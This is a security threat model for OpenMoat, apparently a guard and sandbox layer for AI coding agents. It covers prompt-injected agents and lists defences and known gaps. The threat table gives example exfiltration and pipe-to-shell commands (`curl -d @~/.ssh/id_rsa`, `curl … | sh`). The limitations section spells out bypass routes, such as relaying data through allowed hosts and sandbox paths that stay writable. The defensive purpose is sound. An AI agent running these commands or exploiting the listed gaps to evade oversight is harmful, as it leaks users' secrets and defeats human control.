# Threat model

[README](../README.md) · [Docs index](README.md) · [openmoat.dev/docs](https://openmoat.dev/docs/)

> [!NOTE]
> **Read this when** you need to know what OpenMoat defends, how the hook and the OS layers answer each threat class, and where it stops.

**On this page:** [1. Assets](#1-assets) · [2. Attacker](#2-attacker) · [3. Threat classes](#3-threat-classes) · [4. Out of scope](#4-out-of-scope) · [5. Known limitations](#5-known-limitations) · [6. How the claims are tested](#6-how-the-claims-are-tested)

What OpenMoat defends, against whom, how well the current code does it, and where it
does not. The hook decides each tool call it sees; the operating system enforces the
policy only inside the host sandboxes and `moat run` ([SANDBOX.md](SANDBOX.md)), with the
limits in §5. Per-threat test counts are in [COVERAGE.md](COVERAGE.md), generated from the
conformance fixtures.

## 1. Assets

| # | Asset |
|---|---|
| A1 | Secrets on the machine: SSH keys, cloud credentials, tokens in the environment and in `.env` files, keychains |
| A2 | Source code and git history |
| A3 | Supply-chain position: publishing packages, pushing to CI, editing workflows |
| A4 | The developer's identity and reach: GitHub, cloud consoles |
| A5 | The kernel itself: policy, lock, hook configuration, the `moat` binary, the audit log |

## 2. Attacker

The attacker controls any text the agent reads: files, READMEs, issue titles, pull
request bodies, web pages, MCP tool descriptions and results, dependencies. The
attacker can publish packages and MCP servers. The attacker does not have root or
the user's shell on the machine. The model is treated as untrusted: its tool calls
are requests, and a hallucinated destructive command is handled the same way as an
injected one.

Trust zones:

| Zone | Trust |
|---|---|
| `moat` binary and the policy, after the lock check | trusted |
| The host (agent process and its hook plumbing) | semi-trusted: assumed to call the hook honestly, may be fail-open |
| The model's tool calls | untrusted |
| Commands, MCP servers, project scripts | untrusted |
| A repository policy (`<project>/.moat/policy.yaml`) | untrusted: it may add deny and ask rules; its allow rules apply only to the exact file a person trusted with `moat trust` (ADR-022) |
| Policy and hook files | integrity-checked on every call |

## 3. Threat classes

"Hook" is what the default policy decides today. "OS layer" is what the host
sandboxes and `moat run` add today, or the planned answer from the
[roadmap](ROADMAP.md) where it says *planned*; §5 lists the gaps.

| # | Class | Hook | OS layer |
|---|---|---|---|
| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, glob operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net`; a known kind of token or a brokered secret's placeholder sent to a host that is not its own is denied by `token-egress` and `placeholder-egress`, allowed hosts included | No reads of secret paths, network only through a proxy to allowed hosts |
| T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, and MCP path arguments | Only under `moat run`: Claude Code's and Cursor's file tools run outside their sandboxes |
| T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset` | *Planned:* a scrubbed environment |
| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; a recursive `rm` that may reach the project root or beyond and discarding checkouts are not allowed, so they defer to the agent's own prompt (ADR-025) | Writes outside the project and the temp directory never reach the disk: refused on macOS, made in an in-memory home that is discarded on Linux ([SANDBOX.md](SANDBOX.md)); inside the project only the hook decides |
| T5 | Supply-chain execution (`curl … \| sh`, unknown installs, typo-squats, made-up package names, fresh malicious versions) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; an install of a name one typo or a common trick away from a popular package asks (`package-near-miss`, ADR-030), other installs are left to the agent's own prompt (ADR-025), and the OS sandbox confines install scripts | Network only to allowed hosts (the registries); inside `moat run`, npm and uv install no version published in the last 7 days (`sandbox.package_min_release_age_days`) |
| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008); `git --git-dir=…` and git config that runs a program (`git -c`, `git config`) ask (`git-internals`), setting `GIT_CONFIG_*` is denied (`env-poison`), and under `moat run`, Claude Code and Codex git opens a bare repository only when named (`safe.bareRepository=explicit`) | Writes outside the project (shell startup files) never reach the disk, as for T4; in-project `.git/hooks` and `.envrc` refused except the gaps in [EVIDENCE.md](EVIDENCE.md); *planned:* a kernel-controlled environment |
| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable`, never `allow` (it defers under the default policy and asks under an `ask` catch-all, ADR-025), while the parts around it are still decided, so a deny among them stands; a line not read in full or past a classifier limit asks, so padding cannot turn a deny into a defer | The sandbox bounds what any spelling can reach |
| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny; arguments nested deeper than 8 levels are `unparseable` (deferred under the default policy); the lock pins each server definition the agents read (user and project files), and a changed or new server's tool calls are denied (`mcp-server-changed`) until a person runs `moat mcp accept` (ADR-026) | Opt-in: `moat mcp proxy` pins each tool's description and input schema, hides a changed or new tool (every tool of a server it has not seen, ADR-032) until `moat mcp accept`, and with `--sandbox` starts the server under `moat run` |
| T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories (also where `MOAT_HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `CURSOR_CONFIG_DIR` moved them), hook files, and agent runs of `moat allow\\|doctor\\|init\\|policy\\|secret\\|trust\\|uninstall`, `moat sandbox sync` and `moat audit anchor`, and reads of the audit log, the lock, `hosts.json`, the approvals, the trust records and the MCP pins (the policy stays readable); a policy pack is installed only when its OpenSSH signature verifies against a key a person trusted, and is pinned (ADR-031); the lock denies everything after drift, except drift of only Claude Code's own display toggles and permission lists, which is recorded and reported while the hook keeps deciding every call (§5); Claude Code `ConfigChange` blocks a drifted settings file; a repository policy adds only deny and ask rules unless a person trusted that exact file in that checkout, and one that does not parse or sets `defaults`, `executables` or `sandbox` denies every call in the project (ADR-022); a database shell (`sqlite3`, `duckdb`) opening the audit log is a write, so `kernel-self` denies it | Under Claude Code's and Codex's sandboxes, commands cannot change `~/.moat`, the agents' settings and hook files in the home, or those in the project root (`.claude/settings*.json`, `.cursor/hooks.json`, `.cursor/sandbox.json`, `.codex/hooks.json`, `.moat`). On Linux the same files in a project subdirectory stay writable (`claude-code.linux-write-globs`, `codex.linux-write-globs` in `moat sandbox show`), and Cursor's sandbox cannot deny inside the workspace (§5); the state read denies hold in Seatbelt (`moat run` on macOS) and the host sandboxes that take them; Landlock cannot deny inside a grant, so on Linux `moat run` refuses to start where a grant holds the state directory (§5) |
| T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/moat` and to the recorded binary, its directory and its link target by literal path, which the host sandboxes and Claude Code's deny rules name too; `moat init` refuses a binary inside a project, a temp directory or a directory the sandboxes may write; `doctor` names a missing or different hook binary | Releases carry build provenance attestations |
| T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` defers localhost to the agent's own prompt; `moat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host defers to the agent's own prompt (ADR-017, ADR-025); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Host sandboxes allow only the policy's hosts; `moat run`, and host sandboxes with `sandbox.proxy_port`, go through `moat proxy` |
| T13 | Publishing through a push: an injected agent commits a token or a CI workflow change and pushes, so the secret is published or CI runs the change with the repository's secrets | The push check ([POLICY.md §4.2](POLICY.md#42-the-push-check)) reads the commits a `git push` or `gh pr create` would send: a known token format or a brokered secret's value in an added line or a message denies (`push-secret`); a change to a `runs-later` file in a session that read untrusted content or a secret asks (`push-runs-later`); a push it cannot check within 10 s or 8 MiB asks (`push-unchecked`) | None: the push goes to a host the policy allows |

## 4. Out of scope

- An attacker with root, or with the user's own shell outside the agent.
- A malicious `moat` binary from a compromised release pipeline. Releases carry build
  provenance attestations (`gh attestation verify`), which show where an artefact was
  built, not that the pipeline was sound.
- Attacks on the model provider, and agents that run in a vendor's cloud.
- Prompt-injection detection in text. OpenMoat governs actions, not intent.

## 5. Known limitations

These hold for the current code. Each is a design consequence or a tracked gap, not
something OpenMoat claims to stop.

- **MCP servers start before OpenMoat sees a call.** A host starts its MCP servers when
  a session begins, outside every sandbox. When a definition changed or was added and
  no person accepted it, OpenMoat denies that server's tool calls, but the command has
  already run once. Only `moat mcp proxy --sandbox` or `moat run` confines it. Without
  `moat mcp proxy`, a server can change its tool descriptions unseen. With it, every
  tool waits for a person's `moat mcp accept`, the first listing of a new server too
  (ADR-032), but prompts, resources, tool results and remote (HTTP) servers are not
  pinned. `mcp: { trust_first_sight: true }` in the policy brings back pinning a new
  server's first listing unseen, so a server malicious from its first start gets its
  descriptions pinned as good; `moat policy lint` warns while it is on. Servers the
  proxy pinned on first sight before ADR-032 keep those pins. Plugin and managed MCP
  servers are not read (ADR-026).

- **Package checks are offline and name-based (ADR-030).** `package-near-miss` compares
  each installed name with a bundled list of popular names per registry, written by
  hand and refreshed with `scripts/refresh-top-packages.py`; nothing asks a registry.
  So: a squat on a name that is not on the list, or one more than one edit away
  (`reqests2`, another GitHub owner of the same Go repository), is not asked about; a
  real but less popular package close to a listed one asks once; the list goes stale
  between releases; names of four letters or fewer are never compared; a package the
  agent made up that resembles nothing is a normal unknown name and defers; and
  what a package does (install scripts, maintainer changes, a compromised popular
  package) is not looked at. Installs from a lockfile or a requirements file
  (`npm ci`, `npm install`, `pip install -r`) and dependencies pulled in by a package
  are not checked; nor are `npx`, `uvx`, `pnpm dlx` and `bunx`, which download and run
  a package. The release age `moat run` asks for (`sandbox.package_min_release_age_days`)
  reaches only npm (`npm_config_before`) and uv (`UV_EXCLUDE_NEWER`), not pip, pnpm,
  Yarn or Bun, nothing outside `moat run`, and not uv in a project with a `uv.lock`;
  it delays a malicious version rather than detecting it, and a program that resets
  the variables escapes it.

- **Outside the sandboxes, the hook decides alone.** `moat run` (below) is the one
  place OpenMoat applies a sandbox itself. In the Standard tier (ADR-018), `moat init`
  configures the agent's own sandbox from the policy, so commands Claude Code runs
  through `Bash`, `PowerShell` and `Monitor`, every command Codex runs, and the
  terminal commands Cursor runs in its sandbox are confined by the operating system:
  no reads of `secrets-paths`, no reads outside the project and `sandbox.read_roots`,
  no writes outside the project (and the temp directory) that reach the disk (on
  Linux they land in an in-memory home that is discarded), and no network except
  allowlisted domains. A classifier mistake inside those bounds is
  still a bypass, and in scope as a vulnerability ([SECURITY.md](../SECURITY.md)).
- **What the Standard tier does not cover.** It is as strong as each host's sandbox
  and OpenMoat's translation, and every host version bump must keep the generated keys
  working (`moat doctor` names a weakened setting; the differential suite executes
  them, [EVIDENCE.md](EVIDENCE.md)). Cursor's `sandbox.json` cannot deny a path
  inside the workspace, so the policy's denies there (`.env`, `.moat`, `.git` apart
  from the hooks and config Cursor protects itself) do not bind its sandboxed
  commands, and Cursor runs some commands outside its sandbox (below and
  [SANDBOX.md](SANDBOX.md#cursors-sandbox)). On Linux, Claude Code's sandbox denies a
  project script the `.env` files that exist under the session's working directory when
  the command starts (#359); one created later, or one in another readable directory
  (`/add-dir`, a read root, a path outside the user directories), stays readable.
  It also drops every glob among the write denies (#372): only `.env`, `.envrc` and
  `.moat` directly in the working directory, and that directory's own `.git` hooks and
  config, are kept from sandboxed writes there; a `.env` or `.moat` in a subdirectory,
  `.env.local`, `.git/info/attributes`, submodule hooks and a project's `bin/moat` stay
  writable. Codex on Linux hides a `**/` deny's matches only after listing every directory below
  it, and runs no command when one is unreadable, so the generated profile repeats the
  `.env` denies only in the project and the read roots inside the home (#358): a
  sandboxed command can read a `.env` under `/etc`, `/usr` or `/tmp` outside the
  project, and on Linux a `.env` created after the command started. It can also
  create a missing match there, except `.env` and `.envrc` directly in a workspace
  root, which the profile denies by name (#377): `.env.local`, a `.envrc` in a
  subdirectory and a project's `bin/moat` stay creatable. OpenMoat does not configure
  terminal input (`TIOCSTI`) in the host sandboxes; what EVIDENCE.md shows is the hosts'
  own behaviour: Claude Code starts its commands without a terminal, Codex's macOS
  profile refuses `TIOCSTI`, and Codex's Linux sandbox does not, so only a kernel with
  `dev.tty.legacy_tiocsti` at 0 (`EIO`, as on CI's runner) stops a sandboxed script
  there from typing a command into the terminal for the user's shell; `moat doctor` warns on Linux with Codex set up when that setting allows it, or when the kernel (before 6.2) has none. Claude Code's file tools, `WebFetch`, MCP servers and hooks run
  outside its sandbox; only the hook governs them. Writes by a sandboxed command to
  the session's working directory are allowed even when the session started above
  the git root, and Claude Code leaves paths outside the user directories (`/Users`,
  `/home`, `/Volumes`, …) readable. `sandbox.read_roots` (toolchains, `/usr`, temp)
  are readable by sandboxed commands while the hook defers or asks for them. Egress goes
  to allowlisted domains through the hosts' proxies, which check the requested host
  name, so any allowlisted host stays a relay. `moat sandbox show` lists every loss
  and allowance; ADR-018 lists the open risks.
- **Translation losses (stricter than the policy).** Neither host can re-allow
  `.env.example`, `.env.sample` or `.env.template` inside the `**/.env.*` deny, so
  sandboxed commands cannot read them; Claude Code's file tools refuse them too, by the
  deny rules `moat init` writes on every OS so that they hold when the hook does not run. Codex keeps `.git` read-only for sandboxed
  commands and asks to run `git commit` outside. Claude Code's file tools refuse reads outside the
  working directories (`permissions.blockReadsOutsideWorkingDirectories`) where the
  hook would defer or ask.
- **Claude Code's sandbox writes `.git`.** So that `git commit` works, sandboxed
  commands may write any `.git` except `hooks`, `config`, `config.worktree`,
  `info/attributes`, a linked worktree's `commondir` and the same in submodules
  (ADR-021, #203); renaming `.git` or `.git/hooks` is refused too. On Linux only the
  working directory's own repository is covered, by Claude Code itself, without
  `info/attributes` and submodules (#372). A script can still
  rewrite refs and objects (history tampering, which `git log`, signatures and review
  can show), write a rebase todo that a person later continues, or write a `.git`
  *file* (`gitdir: …`) below the project. The hook asks for any write to a `.git`
  file or directory in the project, nested ones included, and for `git --git-dir=…`;
  `moat run` on macOS keeps a nested `.git` unwritable too. Git does not open a
  directory that merely looks like a bare repository under `moat run`, Claude Code or
  Codex (`safe.bareRepository=explicit`, git 2.38 or later; Cursor has no setting for it).
- **The Lightweight tier (`moat run`) is weaker per command than the Standard tier.**
  It confines the agent process and everything it starts in one sandbox
  ([ARCHITECTURE.md](ARCHITECTURE.md) §14). What the agent needs, every script it runs
  gets too:
  - its executable and `--write` state directory;
  - its API host through the proxy;
  - credentials in its environment (`ANTHROPIC_API_KEY`).

  The keychain is never granted, so a project script cannot read the agent's OAuth
  token from it. The agent's own sandbox must be off inside, because sandboxes do not
  nest, so there is no per-command boundary below OpenMoat's. Unlike the Standard tier,
  the agent's in-process tools (file tools, `WebFetch`, the MCP servers it starts) are
  inside the sandbox too.

  Other limits:
  - Network is the proxy alone: a tool that ignores `HTTP(S)_PROXY` has none, and
    any allowlisted host stays a relay.
  - On macOS it uses `sandbox-exec`, which Apple has deprecated (Codex, Claude Code
    and Chromium still use it). It needs macOS 14 or later: the generated profile
    names `(ioctl-command TIOCSTI)`, an identifier `sandbox-exec` only recognises
    from macOS 13 onwards. On macOS 12 and earlier `sandbox-exec` refuses to parse
    the profile and `moat run` exits without starting the agent (fail closed). CI
    covers `macos-14` and `macos-15-intel`; GitHub Actions no longer offers a
    `macos-13` runner, so macOS 13 is not exercised and is unsupported in practice
    (#389).
  - The profile leaves every file's existence, size and times visible.
  - On Linux, Landlock only grants. Secrets inside a granted tree stay readable and
    writable for the agent's commands: `.env` in the project, `~/.cargo/credentials.toml`
    in a read root, the project's `.git`; `.envrc` and `.moat` can be created. The hook still denies them for the agent's
    tool calls. `moat run --isolate` closes this where bubblewrap runs (below).
  - Also on Linux, the proxy's port is reachable on any host.
  - On Linux a seccomp filter allows only IPv4 and IPv6 TCP sockets, so the user's
    D-Bus session bus, other Unix sockets, UDP, raw, netlink and packet sockets are
    closed (`EPERM`), and `io_uring`, which could create sockets around the filter, is
    refused. So are `ptrace` and `process_vm_readv`/`writev`: a command cannot read
    the agent's memory, and debuggers do not work. Names resolve only through the
    proxy: a tool that ignores `HTTP(S)_PROXY` cannot resolve them. `socketpair()`
    stays allowed; its sockets reach only each other.
  - The agent shares the user's terminal. Typing into it is refused: `TIOCSTI` on
    macOS (Seatbelt), `TIOCSTI` and `TIOCLINUX` on Linux (the seccomp filter, also
    inside `--isolate`), whatever the kernel's `dev.tty.legacy_tiocsti` says.
    Otherwise a script could leave a command in the terminal's input that the
    user's shell runs after the session, outside the sandbox (CVE-2017-5226). Output
    is not filtered: escape sequences a command prints reach the terminal emulator.
    OpenMoat's own text output (`moat show`, `moat status`, `moat policy check`, the
    guard's deny line) shows control characters in agent text as `?`.

  `moat run` prints each allowance before the agent starts. What it stops in an allowed
  project script, per operating system, and the gaps above, are executed in CI and
  listed in [EVIDENCE.md](EVIDENCE.md).
- **The Isolated tier (`moat run --isolate`) is Linux only so far.** bubblewrap gives
  the agent a root with only the project, the read roots, the `--write` paths and an
  empty temp directory, and a network namespace whose only exit is OpenMoat's proxy,
  with the Lightweight tier's Landlock rules and seccomp filter inside
  ([SANDBOX.md](SANDBOX.md#moat-run---isolate-isolated-tier-linux)). It hides what the
  policy denies inside those trees only where it exists when the session starts (and
  `.env`, `.envrc` and `.moat` directly in the project even when missing): a match a
  command creates later stays open to the agent's commands. The agent and its scripts
  still share one sandbox, so everything the agent needs (its state, its API host,
  the credentials in its environment) its scripts get too. It depends on bubblewrap and
  on the kernel's user namespaces, which have their own CVE history. On macOS it
  refuses until it has a virtual machine (#175).
- **Project scripts run arbitrary code.** `npm test`, `npm run *`, `cargo test`,
  `cargo run`, `make`, `make test`, `pytest`, `python -m venv` and similar are allowed
  by `dev-shell`. They run whatever the project's scripts, build files and test files
  say, and OpenMoat sees only the command line. `source .venv/bin/activate` runs the
  project's activate script in the agent's shell, and the `PATH` it sets makes later
  commands in that shell run programs from the project's `.venv/bin`. An agent that can write into the project can therefore run
  any code through an allowed command. In the Standard tier that code runs inside the
  host's sandbox, and under `moat run` inside OpenMoat's, with the bounds above. Under
  Cursor the code runs in Cursor's sandbox as the `sandbox.json` OpenMoat generates
  sets it (macOS and Linux), which cannot deny a path inside the workspace (`.env`,
  `.git` stay open to it), and with the user's permissions when Cursor runs the
  command outside it: after its Auto-review classifier approves it, in Run Everything
  mode, in Allowlist mode with sandboxing off, in the Cursor CLI without `--sandbox
  enabled`, and on native Windows. The Cursor CLI can also run under `moat run`
  (SANDBOX.md).
- **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
  `github.com` and the package registries. The host check passes for any command
  that reaches them, so a command that is itself allowed (a project script) or that
  the agent's own prompt lets through (`curl -X POST https://api.github.com/gists -d
  @file` is decided on its `shell` atom only, which the default policy defers) can send data there. A `WebFetch` GET can
  carry data in its URL; the prompt shows the URL. Session taint (POLICY.md §4.1)
  narrows this. After a secret read, `net`, `fetch` and MCP calls in the same session
  ask. After a `fetch` or an MCP result, writes to CI, git hooks, the build and
  test definitions of every ecosystem the default policy runs (`package.json`,
  `CMakeLists.txt`, `pom.xml`, `build.gradle`, `*.csproj`, `Rakefile`, `conftest.py`,
  `.cargo/config.toml`, …; POLICY.md §4.1) and agent instruction files ask, and so
  do writes to the paths a policy adds under `taint.protected_writes`.
- **Token shapes are checked where the guard sees them, and only the known ones.**
  `token-egress` denies a GitHub, OpenAI/Anthropic, AWS, Slack, Google, npm or GitLab
  token going to a host that is not its service's, allowed relays included (POLICY.md
  §6). It sees URLs, web search queries, MCP URL arguments and the arguments of a
  command that connects to a host and of commands piped into it. It does not see a token
  in a file the command uploads (`curl -d @file`), a here-document, a variable whose
  value is not in the command line, a config file (`.curlrc`), a proxy variable that
  redirects the request, an encoded or split token, MCP arguments other than URLs, or a
  token of any other format: no entropy guessing, so tokens without a vendor prefix
  (and generic `Authorization: Bearer` values) pass. A token sent to its own service is
  not checked, whatever account it belongs to; a self-hosted GitLab or GitHub Enterprise
  server is not the service's host, so a token sent there is denied.
- **Session taint is minimal.** It follows host tool calls only. `moat run`'s proxy
  applies it to the run's connections (ADR-027): after a hook-visible call of a linked
  agent session read secret material, a request to any host but that secret's own is
  refused. A hook inside `moat run` gets its decision from the `moat run` process
  (ADR-028), which writes the links. Connections through the standalone `moat proxy` (the host
  sandboxes' `sandbox.proxy_port`) carry no session, and taint does not apply to them.
  It does not count these as untrusted content: shell network to
  allowed hosts (`gh pr view`, `git pull`), an allowed command that reads secrets at run
  time (a project script), or a command OpenMoat cannot classify. A secret that leaves
  through an allowed command without a `net` atom (`npm test`) is not seen. With the
  default policy, `secrets-paths` denies, so only the secrets broker (#172) or a policy
  that asks for secret reads can taint a session. An edited or deleted audit event
  clears taint until `moat doctor` reports the broken chain.
- **Taint follows written files only partly.** An injected session can write a payload
  to a script or a config that another session (or a person's later session) reads or
  runs. File provenance (ADR-029, POLICY.md §4.1.1) records each file a tainted
  session writes by a literal path and taints a later session that reads or runs it,
  so that session's protected writes ask. A file is tracked by its path, not its
  content: a copy or a rename is followed only when the command shows the source as a
  read in the same call (the session is then tainted and the destination recorded), and
  not at all when a clean session's command does it out of sight. Content produced
  indirectly (a script or a build that writes another file, a download a command saves)
  and files read through a directory search (`Grep`, `Glob`) are not tracked. An `Edit`, a shell write and an `apply_patch` carry no hash, so such a file
  taints every later reader until a clean session rewrites it with `Write`; a `Write`'s
  hash stops matching when anything changes the file, a change no session made
  included, and then the file no longer taints. Provenance rows are outside the hash
  chain: they sit in the same OpenMoat-only database, append-only by trigger, but an
  edit with write access to `~/.moat` is not reported by `moat doctor`.
- **A proxy credential is shared by everything in its session.** `moat run`'s proxy
  serves only requests that carry the run's credential (ADR-027), which keeps other
  local programs and other runs off it. The credential sits in the agent's environment,
  so every command in the run's sandbox has it; they all are the session. A process of
  the same user outside the sandbox that can read the agent's environment (`ps eww` on
  some systems, `/proc/<pid>/environ` on Linux) can use the session too. The standalone
  `moat proxy` asks for no credential, so any local process may use it.
- **The hook relay of `moat run` is attack surface (ADR-028).** Hooks inside the run's
  sandbox cannot open `~/.moat`, so they send each payload to the `moat run` process
  over the proxy's loopback port with the run's `MOAT_GUARD_TOKEN`, and that process
  decides with its own access. What it trusts and why:
  - *The token, for who may ask.* It is 256 bits, made per run and never written to
    disk, compared in constant time. A wrong one is recorded (`run-guard-token`) and
    gets no decision. As with the proxy credential, every process in the sandbox holds
    it and a same-user process that can read the agent's environment could take it.
    That is enough because what the token buys is small: a real decision on a payload
    the asker chose, recorded as such. Any process outside `moat run` gets the same by
    running `moat guard` itself. It cannot choose the verdict of a row, change the
    lock or the policy, read a secret source, or make taint looser: link rows only add
    sessions to the run, and taint only tightens.
  - *Nothing in the payload beyond what `moat guard` already trusts.* The payload,
    host, Continue flag and working directory are the hook's input, parsed and decided
    as outside `moat run`; each field has a size limit checked before it is read.
  - *The endpoint, for the hook.* The sandboxed guard trusts the reply only from the
    address in its environment, which its host set, and only when the reply repeats
    the request's random nonce and carries exit 0 or 2. `moat run` holds the port for
    the whole run and the sandbox lets nothing bind one, so a command in it cannot
    take the port over. A command can point a guard it starts itself at a server of its
    own, which then answers that guard. That gains nothing: the command could skip the
    guard altogether, a forged answer leaves no audit row, and the hooks the host
    starts keep the host's environment.
  - Everything that goes wrong denies in the sandboxed guard, and the sandbox stays
    closed to `~/.moat` (tested in `tests/e2e/run_guard.rs`).
- **The secrets broker (ADR-020) keeps a value from the agent, nothing more.**
  `openmoat-proxy` holds the value of each `secrets:` entry. It refuses and records
  (`proxy-secret`) any request to another host whose head, or plain-HTTP body, carries
  the placeholder or the value. It defends against a prompt-injected agent that sends
  the token it holds to a host of the attacker's choosing, or through an allowed relay.
  The agent only ever holds the placeholder. It does not defend against:
  - an agent that reads the source itself (a file or variable no deny rule covers;
    `moat policy lint` warns);
  - the value encoded (base64, percent-encoding, compression) or split across requests,
    since the check matches exact bytes;
  - anything inside a CONNECT tunnel, which is TLS and is not decrypted;
  - an observer on the network path of a plain-HTTP request to the owner host. The proxy
    injects the value there in clear text, but only for a secret that opts in with
    `plain_http: true`, which `moat policy lint` flags for any host off this machine;
  - covert channels such as timing, or data hidden in requests to the owner host;
  - before the proxy: `moat guard` denies a placeholder in a URL, web search or
    connecting command's arguments to another host (`placeholder-egress`), but not one
    in a file, a here-document, an environment variable or an encoded form;
  - an agent that asks the user to paste the secret into the conversation;
  - the owner host itself misusing or reflecting the token;
  - traffic that does not go through `moat proxy`: the agent's own requests and
    in-process tools; every host sandbox command unless the policy sets
    `sandbox.proxy_port`; and even then, under Codex, every command whose Codex was
    started without `HTTP(S)_PROXY` naming it (ARCHITECTURE.md §13).
- **By default the host sandboxes' own proxies decide network.** The default is no
  `sandbox.proxy_port`. Claude Code's and Codex's proxies then enforce the policy's
  domain names, with no direct route out. They do not write OpenMoat's audit log and
  decide only by domain name; only Claude Code's injects brokered secrets (next item),
  Codex's does not. Claude Code still refuses local addresses through its own check;
  Codex refuses link-local and private ones.
- **Claude Code's mask mode is Claude Code's broker, not OpenMoat's.** For each
  `secrets:` entry with an `env` or `file` source whose host is in `net` allow,
  `moat sandbox sync` writes a `sandbox.credentials` `mask` entry limited to that host
  and turns on `network.tlsTerminate`, which Claude Code needs for masking and calls
  experimental ([sandboxing](https://code.claude.com/docs/en/sandboxing#mask-credentials)).
  Sandboxed commands then hold a placeholder and Claude Code's proxy, which now
  terminates their TLS, sends the value to that host. OpenMoat does not see or record
  those requests, and Claude Code's proxy adds no content filtering. A `keychain`
  source, a host outside `net` allow, and a `plain_http` secret mixed with HTTPS ones
  are not masked; they keep the hook's and `moat proxy`'s handling. On macOS a `file`
  source is denied, not masked. `moat doctor` reports each secret's state and flags a
  hand-set `credentials.allowPlaintextInject`.
- **With `sandbox.proxy_port`, host sandbox network depends on a running `moat proxy`.**
  - Claude Code's sandboxed commands reach the network only through it. While it is
    stopped they have none, and `moat doctor` and `moat status` warn; nothing falls
    back to direct network.
  - Programs that speak only SOCKS5 have no network at all.
  - Codex's proxy hands what it allows to `moat proxy` only when Codex runs with
    `HTTP(S)_PROXY` naming it, which `config.toml` cannot set.
  - Codex's own API requests then go through `moat proxy` too. Its API hosts
    (`api.openai.com`, `chatgpt.com`) need a `fetch` allow rule, or Codex cannot reach
    its model.
- **An allowed host can front for another site on the same provider.** `moat proxy`
  checks the cleartext TLS server name against the CONNECT host and refuses an
  encrypted one (ECH, unless `sandbox.proxy_allow_ech`), but it does not see the HTTP
  `Host` header inside the tunnel, which some CDNs still route by.
- **When the hook fails, most hosts run the call.** The host rows below come from
  each host's documentation or source as of 2026-10-07 ([Claude Code hooks][cc-hooks],
  [Codex hooks][codex-hooks] and [`pre_tool_use.rs`][codex-pre],
  [`command_runner.rs`][codex-runner], [Cursor hooks][cursor-hooks], Continue
  [`hookRunner.ts`][cn-runner]); *unverified* marks what the source does not state.
  The rows marked "ours" are tested end to end with the real binary
  (`crates/openmoat-cli/tests/e2e/host_failures.rs`), and `protection.rs` (`gaps`)
  repeats the host rows in each agent's `known gaps` line.

  | Case | Claude Code | Codex | Cursor | Continue CLI |
  |---|---|---|---|---|
  | Hook binary missing or cannot start | 2.1.295 and later: blocks, `moat init` sets `onFailure: "block"` on `PreToolUse`; before: runs the call | runs the call | blocks: `moat init` sets `failClosed` (*unverified* for a missing binary; Cursor runs a shell string, which exits 127) | runs the call |
  | Hook crashes or exits non-zero, not 2, without output | 2.1.295 and later: blocks (`onFailure`); before: runs the call | runs the call | blocks (`failClosed`) | runs the call |
  | Hook times out | 2.1.295 and later: blocks (`onFailure`); before: runs the call | runs the call | blocks (`failClosed`) | runs the call (a killed hook counts as exit 0) |
  | Timeout: host default / set by `moat init` | 600 s / 600 s (`ConfigChange` 60 s) | 600 s / 600 s | not documented (*unverified*) / 600 s | 600 s / 600 s (Claude Code's entry) |
  | Hook prints no or malformed JSON, exit 0 | runs the call | runs the call | blocks (permission hooks) | runs the call |
  | Exit 2 | blocks | blocks when stderr is not empty | blocks | blocks |
  | Ours: malformed or truncated payload, unknown event | deny, exit 2 | deny, exit 2 | deny, exit 2 | deny, exit 2 |
  | Ours: tool OpenMoat does not know | defer (no output: Claude Code's own prompt and rules decide), rule `ungoverned`, recorded | as Claude Code | a tool naming a path is checked as writing it (reading it only for Cursor's listing and search tools); otherwise `tool.unknown`, which asks (sent as a deny) | as Claude Code |
  | Ours: no decision within 30 s (`GUARD_BUDGET_S`) | deny, exit 2; listed in `~/.moat/guard-hangs.log`, not the audit log | same | same | same |
  | Ours: hook missing, out of date or naming a binary that does not exist | `moat status` and `moat doctor`: `not protected` | same | same | not applicable: `cn` fires no hooks (below) |

  `guard` writes the reason of every deny to stderr, so Codex honours its exit 2, and
  turns its own panics into a deny. A crash that bypasses that (killed, aborted, out of
  memory) or a missing binary leaves Codex and `cn` with no way to block: neither has a
  fail-closed setting. Claude Code has one since 2.1.295 (`onFailure: "block"` on a
  `command` hook: a hook that cannot start, crashes, exits other than 0 or 2, or times
  out then blocks the call as exit 2 does). `moat init` writes it on the `PreToolUse`
  entry only when the `claude` on `PATH` reports 2.1.295 or later, because the docs do
  not say what an older Claude Code does with a key it does not know, and one hook entry
  its settings schema rejects can stop every hook from running. With an older Claude
  Code, or none on `PATH` (an IDE-only install), the key is left out and `moat doctor`
  warns. A key already written is kept, also after a downgrade below 2.1.295, which then
  depends on that older version ignoring it. `ConfigChange` gets no `onFailure`: a broken
